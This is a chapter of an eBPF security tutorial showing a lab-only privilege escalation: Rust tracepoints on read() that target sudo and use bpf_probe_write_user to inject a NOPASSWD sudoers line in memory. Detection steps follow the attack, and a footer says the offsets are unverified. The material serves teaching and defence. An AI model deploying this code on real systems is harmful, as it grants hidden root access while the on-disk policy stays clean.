---
title: "Faking your way to root (lab-only offense)"
order: 41
part: Security & LSM
description: "The third lab-only offense: intercept the read() a privileged process makes and rewrite the bytes it gets back. When sudo reads /etc/sudoers, inject a line granting full privileges — the file on disk untouched — to see how read-buffer tampering escalates, and how to detect it."
duration: 45 minutes
---

Chapter 39 hid a process by editing a syscall's *output*. The same move,
pointed at a different syscall, escalates privilege. When you run `sudo`, it
reads its policy from `/etc/sudoers` to decide what you're allowed to do. If
an eBPF program rewrites the bytes `sudo` gets back from that `read()` —
injecting a line that grants you everything — `sudo` obeys a policy that was
never written to disk. This is the last of the lab-only offenses, and like
the others its real payload is the **detection** at the end. It is, to be
unambiguous, an attack technique built here only to be understood and caught.

The code is in `examples/41-sudoadd/`. `./demo.sh` there builds, deploys,
and runs it; its `README.md` covers what it does and how to drive it.

{% include excalidraw.html
   file="sudo-escalate"
   alt="sudo calls read on /etc/sudoers. An eBPF read-exit hook checks whether the current process is named sudo and, if so, overwrites the returned buffer in memory. sudo then sees an injected line and grants root. The file on disk is never touched — only the bytes sudo reads into memory. Defense: the same tells as Chapter 39 (kernel taint, loaded programs), and an LSM can block bpf_probe_write_user."
   caption="Figure 41.1 — The file on disk is never touched; only the bytes sudo reads are forged" %}

## Why reads are forgeable

A program trusts what `read()` returns. It has no way to know the bytes came
from the file on disk versus a kernel-side tamperer — the kernel fills a
user buffer and the program parses it. `sudo` is a juicy target because the
bytes it reads (`/etc/sudoers`) *are* the security policy. Overwrite them
between the kernel's fill and sudo's parse and you've rewritten the policy
for that one invocation, leaving the on-disk file pristine and the change
invisible to anyone who `cat`s it.

The mechanics mirror Chapter 39: capture the buffer on `sys_enter_read`,
rewrite it on `sys_exit_read` with `bpf_probe_write_user`. The new wrinkle
is *targeting* — we only want to tamper with `sudo`'s reads, which we do by
matching the process name.

## How the code works

### Capturing the read (enter)

```rust
#[map] static READS: HashMap<u64, ReadCtx> = HashMap::with_max_entries(1024, 0);

#[tracepoint] // syscalls:sys_enter_read
pub fn enter_read(ctx: TracePointContext) -> u32 {
    if !comm_is(b"sudo") { return 0; }                  // only sudo's reads
    // args: fd(@16), char *buf(@24), size_t count(@32)
    let buf: u64 = match unsafe { ctx.read_at(24) } { Ok(v) => v, _ => return 0 };
    let count: u64 = match unsafe { ctx.read_at(32) } { Ok(v) => v, _ => return 0 };
    let _ = READS.insert(&bpf_get_current_pid_tgid(), &ReadCtx { buf, count }, 0);
    0
}
```

We stash the buffer pointer and size, keyed by `pid_tgid`, but only when the
calling process is `sudo` — `comm_is` compares `bpf_get_current_comm()`
against the literal `"sudo"`. Every other process's reads are ignored.

### Rewriting the result (exit)

```rust
#[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0); // injected line + len

#[tracepoint] // syscalls:sys_exit_read
fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;          // bytes read
    let key = bpf_get_current_pid_tgid();
    let rc = *unsafe { READS.get(&key) }.ok_or(())?;
    let _ = READS.remove(&key);

    let p = unsafe { PAYLOAD.get(0) }.ok_or(())?;
    // only tamper a read that actually returned at least our line
    if ret as u64 >= p.len as u64 && rc.count >= p.len as u64 {
        unsafe {
            bpf_probe_write_user(
                rc.buf as *mut core::ffi::c_void,
                p.line.as_ptr() as *const core::ffi::c_void,
                p.len,
            );
        }
        bump(&TAMPERS, 0, 1);
    }
    Ok(())
}
```

The pieces:

- We look up the buffer we recorded on entry. Without the enter hook the
  exit handler would only have the byte count, not where the bytes are.
- The **payload** is a sudoers line like
  `someuser ALL=(ALL:ALL) NOPASSWD:ALL #`, built by the loader and stored in
  a map. It ends in ` #` so that whatever original sudoers content follows it
  in the buffer becomes a trailing comment — the rest of the file still
  parses, but our line is now in force.
- We **overwrite the first `p.len` bytes** of sudo's buffer with the payload
  using `bpf_probe_write_user`. We only do it when the read returned at least
  that many bytes (so we're looking at a real sudoers read, not a tiny one),
  and we count tampers for telemetry.
- `bpf_probe_write_user` is the same **kernel-tainting, lab-only** helper
  from Chapter 39 — using it is itself a detectable event.

The loader builds the payload for a target user (default a freshly created
unprivileged account), writes it into `PAYLOAD`, attaches both tracepoints,
and exports `ebpf_sudo_tampered_total`.

## Build, deploy, observe

```bash
cd examples/41-sudoadd && ./demo.sh
```

The demo creates an unprivileged user on the target, builds a payload
granting *that* user sudo, attaches the program, and then repeatedly invokes
`sudo` so the tamper counter moves. The point to see is the **before/after**:
with the program detached the unprivileged user cannot use `sudo`; with it
attached, `sudo` reads the injected policy and lets them run commands as
root — while `cat /etc/sudoers` on disk shows no such line.

## Detecting it

The same toolkit as Chapter 39, plus one policy control:

1. **Kernel taint.** `bpf_probe_write_user` sets `TAINT_USER`;
   `/proc/sys/kernel/tainted` is non-zero and `dmesg` warns once, naming the
   writer. A program writing into `sudo`'s memory is about as load-bearing an
   alert as you'll get.
2. **Unexpected loaded programs.** `sudo bpftool prog show` reveals
   tracepoints on `read` — there is no benign reason for one to exist on a
   server, and enumerating loaded programs is a standing detection.
3. **Policy that disagrees with behavior.** What `sudo` *granted* doesn't
   match what `/etc/sudoers` *says*; an auditor comparing effective sudo
   rights against the on-disk policy (or watching for the taint) catches it.
4. **Prevent the primitive.** An LSM program (Chapters 37, 40) can deny the
   `bpf` operations that load such tools, or restrict `bpf_probe_write_user`
   — defense turning eBPF against the very technique.

## What you learned

- A privileged process trusts `read()`; rewriting its result buffer with
  `bpf_probe_write_user` lets you **forge the policy `sudo` reads**, escalating
  privilege without touching the file on disk.
- **Targeting by `comm`** keeps the tampering scoped to the victim process.
- Detection is the same trio (taint, loaded-program enumeration,
  behavior-vs-config audit) — and LSM can deny the loading primitive
  outright.

Next, Chapter 42 closes the security part by turning all of this into a
**telemetry sensor**: many security-relevant hooks feeding one event stream,
the shape of a real runtime-security tool.

---

*Verification status: <span class="status status--unverified">unverified</span>.
Confirm on a real Fedora 44 run: the `sys_enter`/`sys_exit_read` argument and
return offsets (buf @24, count @32, ret @16), that `comm`-matching on `sudo`
catches the sudoers read, that `bpf_probe_write_user` into sudo's buffer
actually changes the parsed policy (payload length and the trailing-comment
padding may need tuning to real sudoers layout), and that
`/proc/sys/kernel/tainted` flips.*
